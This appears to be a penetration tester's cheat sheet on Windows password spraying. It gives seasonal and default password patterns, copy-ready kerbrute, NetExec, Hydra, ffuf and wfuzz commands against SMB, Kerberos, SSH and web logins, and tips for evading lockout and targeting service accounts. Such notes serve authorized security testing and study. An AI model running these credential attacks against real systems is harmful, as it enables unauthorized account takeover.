---
tags:
  - Credential_Access
  - Foundational
  - Initial_Access
  - Password_Attack
---

## Windows Password Spraying
resources: [HackTricks Password Spraying](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying)

> [!info] **What you're looking for:**
> - Valid credential pairs
> - Users with weak/default passwords
> - Seasonal passwords (Company2024!, Winter2024!)

> [!tip] **Common password patterns to try:**
> - *Season + Year*: Spring2024!, Winter2024!, Summer2024!, Fall2024!
> - *Month + Year*: January2024!, December2024!
> - *Company + Numbers*: CompanyName1!, CompanyName123!
> - *Keyboard patterns*: Qwerty123!, Password1!
> - *Default/Lazy*: Welcome1!, Changeme1!, P@ssw0rd!

> [!warning] Spray behavior:
> - **Without `--no-bruteforce` (default behavior):** Every username is tried with every password (cartesian product)
> - **With `--no-bruteforce`:** Usernames and passwords are paired line-by-line (1:1 mapping)

## Check Password Policy [optional]

### Look for: Lockout Threshold, Lockout Duration
```bash
nxc smb <TargetIP> -u <Username> -p <Password> --pass-pol
```

## Kerbrute Password Spray

### Uses Kerberos (Faster)
> [!warning] Passwords might be rejected because **RC4 encryption is disabled** on the domain. Kerbrute uses RC4 (NTLM hash-based) for Kerberos pre-auth by default, but many modern domains enforce **AES-only**.

```bash
kerbrute passwordspray --dc <TargetIP> -d <Domain> /root/machines/<Machine>/<TargetIP>/usernames 'Spring2024!' -v
```

## NetExec Password Spraying

### Single Password
```bash
nxc smb <TargetIP> -u /root/machines/<Machine>/<TargetIP>/usernames -p 'Spring2024!' --continue-on-success
```

### Multiple Passwords (Be Careful with Lockout)
```bash
nxc smb <TargetIP> -u /root/machines/<Machine>/<TargetIP>/usernames -p /root/machines/<Machine>/<TargetIP>/passwords --no-bruteforce --continue-on-success
```

## Hydra Password Spraying

### Keep Password Constant, Enumerate Users
```bash
hydra -L users.txt -p <Password> <TargetIP> ssh -t 4
```

### SMB Password Spray
```bash
hydra -L users.txt -p 'Spring2024!' smb://<TargetIP>
```

## Alternative Tools

### nxc_enum Multi-Credential Mode
> [!tip] Tests multiple credentials from file. Format: `user:password` per line.

```bash
python -m nxc_enum <TargetIP> -C creds.txt -d <Domain> --validate-only --continue-on-success
```

### ffuf Login Brute Force
```bash
ffuf -w /usr/share/wordlists/rockyou.txt -u http://<TargetIP>/login -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fc 401 -c
```

### Wfuzz Login Brute Force
```bash
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -d "username=admin&password=FUZZ" --hs "Invalid" http://<TargetIP>/login
```

## Best Practices

> [!warning] **Lockout prevention:**
> - Check password policy first
> - Use `--no-bruteforce` for 1:1 mapping
> - Limit attempts per user
> - Space out attempts over time
> - Monitor for lockouts

> [!tip] **Effective spraying:**
> - Start with 1-2 common passwords
> - Wait between spray attempts
> - Target service accounts (often no lockout)
> - Try seasonal passwords during relevant times
